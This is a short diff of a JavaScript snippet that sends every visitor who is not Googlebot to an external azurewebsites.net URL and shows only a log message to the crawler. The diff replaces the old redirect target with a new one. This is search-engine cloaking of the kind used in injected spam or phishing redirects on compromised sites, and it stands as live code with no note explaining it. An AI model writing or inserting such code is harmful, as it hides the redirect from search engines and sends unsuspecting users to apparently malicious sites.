@@ -1,5 +1,5 @@
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "https://chudmagix.azurewebsites.net/myx/?lan";
+  window.location.href = "https://chudmagiold.azurewebsites.net/vod/?lan";
 } else {
   console.log("Thanks for visiting my page" );
 }
